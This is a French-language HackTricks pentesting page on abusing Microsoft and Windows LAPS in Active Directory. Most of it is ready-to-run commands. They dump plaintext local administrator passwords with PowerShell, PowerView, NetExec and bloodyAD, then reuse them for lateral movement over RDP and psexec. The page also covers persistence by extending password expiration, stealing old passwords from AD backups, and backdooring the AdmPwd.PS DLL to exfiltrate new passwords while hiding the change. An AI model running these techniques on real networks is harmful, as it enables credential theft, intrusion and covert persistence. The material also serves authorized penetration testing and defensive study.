# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Informations de base

Il existe actuellement **2 variantes de LAPS** que vous pouvez rencontrer lors d'une évaluation :

- **Legacy Microsoft LAPS** : stocke le mot de passe de l'administrateur local dans **`ms-Mcs-AdmPwd`** et l'heure d'expiration dans **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (intégré à Windows depuis les mises à jour d'avril 2023) : peut toujours émuler le mode legacy, mais en mode natif, il utilise les attributs **`msLAPS-*`**, prend en charge le **chiffrement des mots de passe**, l'**historique des mots de passe** et la **sauvegarde du mot de passe DSRM** pour les contrôleurs de domaine.

LAPS est conçu pour gérer les **mots de passe des administrateurs locaux**, en les rendant **uniques, aléatoires et fréquemment modifiés** sur les ordinateurs joints au domaine. Si vous pouvez lire ces attributs, vous pouvez généralement **pivoter en tant qu'administrateur local** vers l'hôte concerné. Dans de nombreux environnements, l'aspect intéressant ne consiste pas seulement à lire le mot de passe lui-même, mais aussi à identifier **qui s'est vu déléguer l'accès** aux attributs de mot de passe.

### Attributs de Legacy Microsoft LAPS

Dans les objets ordinateur du domaine, l'implémentation de Legacy Microsoft LAPS entraîne l'ajout de deux attributs :<sup>[[1]](#references)</sup>

- **`ms-Mcs-AdmPwd`** : **mot de passe de l'administrateur en texte clair**
- **`ms-Mcs-AdmPwdExpirationTime`** : **heure d'expiration du mot de passe**

### Attributs de Windows LAPS

Windows LAPS natif ajoute plusieurs nouveaux attributs aux objets ordinateur :<sup>[[2]](#references)</sup>

- **`msLAPS-Password`** : blob de mot de passe en texte clair stocké au format JSON lorsque le chiffrement n'est pas activé
- **`msLAPS-PasswordExpirationTime`** : heure d'expiration planifiée
- **`msLAPS-EncryptedPassword`** : mot de passe actuel chiffré
- **`msLAPS-EncryptedPasswordHistory`** : historique des mots de passe chiffré
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`** : données chiffrées du mot de passe DSRM pour les contrôleurs de domaine
- **`msLAPS-CurrentPasswordVersion`** : suivi de version basé sur un GUID, utilisé par la logique de détection des rollbacks plus récente (schéma de forêt Windows Server 2025)

Lorsque **`msLAPS-Password`** est lisible, la valeur est un objet JSON contenant le nom du compte, l'heure de mise à jour et le mot de passe en texte clair, par exemple :<sup>[[2]](#references)</sup>
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Vérifier si activé
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## Accès au mot de passe LAPS

Vous pouvez **télécharger la policy LAPS brute** depuis `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`, puis utiliser **`Parse-PolFile`** du package [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) pour convertir ce fichier dans un format lisible par l’humain.

### Cmdlets PowerShell Microsoft LAPS Legacy

Si le module LAPS Legacy est installé, les cmdlets suivantes sont généralement disponibles :
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### cmdlets PowerShell de Windows LAPS

Windows LAPS natif est fourni avec un nouveau module PowerShell et de nouveaux cmdlets :
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
Quelques détails opérationnels sont importants ici :<sup>[[3]](#references)</sup>

- **`Get-LapsADPassword`** gère automatiquement **legacy LAPS**, **clear-text Windows LAPS** et **encrypted Windows LAPS**.
- Si le mot de passe est chiffré et que vous pouvez le **lire** mais pas le **déchiffrer**, le cmdlet renvoie des métadonnées telles que **`Source`**, **`DecryptionStatus`** et **`AuthorizedDecryptor`**, même s'il ne peut pas renvoyer le mot de passe en clair.
- Dans **encrypted Windows LAPS**, la **permission de lecture** et la **permission de déchiffrement** sont des **contrôles différents**. L'accès en lecture à l'OU / à l'objet n'implique pas automatiquement que vous pouvez déchiffrer **`msLAPS-EncryptedPassword`**.
- L'**historique des mots de passe** est uniquement disponible lorsque le **chiffrement Windows LAPS** est activé.
- Sur les contrôleurs de domaine, la source renvoyée peut être **`EncryptedDSRMPassword`**.

C'est utile lors d'un assessment, car le champ **`AuthorizedDecryptor`** indique **pour quel utilisateur ou groupe le blob a été chiffré**, transformant souvent un échec de lecture du mot de passe en nouvelle cible de privilege-escalation.

### PowerView / LDAP

**PowerView** peut également être utilisé pour découvrir **qui peut lire le mot de passe et le lire** :
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Si **`msLAPS-Password`** est lisible, analysez le JSON renvoyé et extrayez **`p`** pour obtenir le mot de passe et **`n`** pour obtenir le nom du compte administrateur local géré.
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
Ce champ **`n`** est important dans les déploiements récents, car la **gestion automatique des comptes par Windows LAPS** peut cibler un **compte personnalisé** au lieu du compte intégré **`Administrator`**, et les systèmes **Windows 11 24H2 / Windows Server 2025** récents peuvent même **randomiser** le nom de ce compte.<sup>[[4]](#references)</sup>

### Linux / outils distants

Les outils modernes prennent en charge à la fois Microsoft LAPS historique et Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Notes :

- Les builds récentes de **NetExec** prennent en charge **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** et **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** reste utile pour le **Microsoft LAPS** legacy depuis Linux, mais il cible uniquement **`ms-Mcs-AdmPwd`**.
- Les outils cross-platform plus récents tels que **`LAPS4LINUX`**, les outils basés sur **`dpapi-ng`** et les workflows **NetExec** récents peuvent également gérer le **Windows LAPS** natif depuis des hôtes non-Windows.
- Si l'environnement utilise le **Windows LAPS** chiffré, une simple lecture LDAP ne suffit pas ; vous devez également être un **decryptor autorisé** (ou disposer d'un matériel de déchiffrement équivalent, tel que le matériel de clé racine DPAPI-NG du domaine hors ligne).<sup>[[5]](#references)</sup>
- Sous **Windows 11 24H2 / Windows Server 2025**, ne supposez pas que l'administrateur local géré est toujours **`Administrator`**. La gestion automatique des comptes peut créer un compte personnalisé et éventuellement randomiser son nom ; découvrez donc d'abord le nom du compte via **`n`** / **`Account`** avant d'utiliser **`--laps`** à grande échelle.<sup>[[4]](#references)</sup>

### Abus de la synchronisation d'annuaire

Si vous disposez de droits de **synchronisation d'annuaire** au niveau du domaine au lieu d'un accès direct en lecture sur chaque objet ordinateur, LAPS peut tout de même être intéressant.

La combinaison de **`DS-Replication-Get-Changes`** avec **`DS-Replication-Get-Changes-In-Filtered-Set`** ou **`DS-Replication-Get-Changes-All`** peut être utilisée pour synchroniser des attributs **confidentiels / filtrés par RODC** tels que **`ms-Mcs-AdmPwd`**. BloodHound modélise cela sous le nom **`SyncLAPSPassword`**. Consultez [DCSync](dcsync.md) pour le contexte relatif aux droits de réplication.

## LAPSToolkit

Le [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilite l'énumération de LAPS grâce à plusieurs fonctions.<sup>[[6]](#references)</sup>\
L'une d'elles consiste à analyser les **`ExtendedRights`** pour **tous les ordinateurs sur lesquels LAPS est activé.** Cela montre les **groupes** spécifiquement **autorisés à lire les mots de passe LAPS**, qui sont souvent des utilisateurs appartenant à des groupes protégés.\
Un **compte** ayant **joint un ordinateur** à un domaine reçoit **`All Extended Rights`** sur cet hôte, et ce droit donne au **compte** la possibilité de **lire les mots de passe**. L'énumération peut révéler un compte utilisateur capable de lire le mot de passe LAPS sur un hôte. Cela peut nous aider à **cibler des utilisateurs AD spécifiques** qui peuvent lire les mots de passe LAPS.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Dumping des mots de passe LAPS avec NetExec / CrackMapExec

Si vous n'avez pas de PowerShell interactif, vous pouvez exploiter ce privilège à distance via LDAP :
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Cela extrait tous les secrets LAPS que l’utilisateur peut lire, ce qui vous permet de vous déplacer latéralement avec un autre mot de passe d’administrateur local.

## Utilisation du mot de passe LAPS
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## Persistance de LAPS

### Date d’expiration

Une fois administrateur, il est possible d’**obtenir les mots de passe** et d’**empêcher** une machine de **mettre à jour** son **mot de passe** en **définissant la date d’expiration dans le futur**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Le LAPS natif de Windows utilise plutôt **`msLAPS-PasswordExpirationTime`** :
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Le mot de passe continuera d'être renouvelé si un **admin** utilise **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, ou si **Do not allow password expiration time longer than required by policy** est activé.

### Limite concernant le rollback des snapshots avec les versions récentes de Windows LAPS

Les anciennes techniques de rollback de snapshots / images sont **moins fiables** contre les déploiements récents de **Windows LAPS**. Sur **Windows 11 24H2 / Windows Server 2025**, si le schéma de forêt inclut **`msLAPS-CurrentPasswordVersion`** (**schéma de forêt Windows Server 2025**), le client compare un GUID mis en cache localement avec la valeur stockée dans AD et **renouvelle immédiatement le mot de passe** lorsqu'un rollback crée un **état incohérent**.

En pratique, cela signifie qu'une persistence basée sur des snapshots ou les tentatives de ressusciter un ancien mot de passe connu de l'administrateur local peuvent rapidement échouer au lieu de survivre jusqu'à la prochaine expiration normale.<sup>[[2]](#references)</sup>

Cette protection s'applique uniquement à **Windows LAPS adossé à AD** et dépend toujours de la capacité de la machine restaurée à **s'authentifier de nouveau auprès d'AD**. Si la machine ne peut plus communiquer avec AD, l'**historique des mots de passe** ou l'**accès aux sauvegardes AD** peuvent encore faire la différence.

### Limite concernant la falsification de la gestion automatique des comptes

Lorsque la **gestion automatique des comptes** est activée, Windows LAPS contrôle le cycle de vie du compte administrateur local géré. Les tentatives inattendues de renommer, reconfigurer ou modifier de toute autre manière ce compte peuvent être rejetées avec **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**. La persistence qui dépend de la modification silencieuse du compte LAPS géré est donc moins fiable sur les endpoints récents.<sup>[[4]](#references)</sup>

### Récupération des mots de passe historiques à partir des sauvegardes AD

Lorsque le chiffrement Windows LAPS + l'**historique des mots de passe** sont activés, les sauvegardes AD montées peuvent devenir une source supplémentaire de secrets. Si vous pouvez accéder à un snapshot AD monté et utiliser le **mode de récupération**, vous pouvez interroger les anciens mots de passe stockés sans communiquer avec un DC actif.<sup>[[3]](#references)</sup>
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Ceci est principalement pertinent lors du **vol de sauvegardes AD**, de l’**abus de la forensique hors ligne** ou de l’**accès aux supports de reprise après sinistre**.

### Backdoor

Le code source original de Microsoft LAPS legacy est disponible [ici](https://github.com/GreyCorbel/admpwd). Il est donc possible d’ajouter une backdoor au code (par exemple dans la méthode `Get-AdmPwdPassword` de `Main/AdmPwd.PS/Main.cs`) afin d’**exfiltrer les nouveaux mots de passe ou de les stocker quelque part**.

Ensuite, compilez le nouveau fichier `AdmPwd.PS.dll` et téléversez-le sur la machine à l’emplacement `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (et modifiez la date de modification).

## Références

- [1] [Introduction à Microsoft LAPS – Solution de mot de passe d’administrateur local](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [2] [Extensions du schéma et des droits de Windows LAPS pour Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [3] [Prise en main de Windows LAPS et de Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [4] [Modes de gestion des comptes Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [5] [Internals de LAPS 2.0 - Blog XPN Infosec](https://blog.xpnsec.com/lapsv2-internals/)
- [6] [LAPSToolkit - leoloobeek](https://github.com/leoloobeek/LAPSToolkit)

{{#include ../../banners/hacktricks-training.md}}
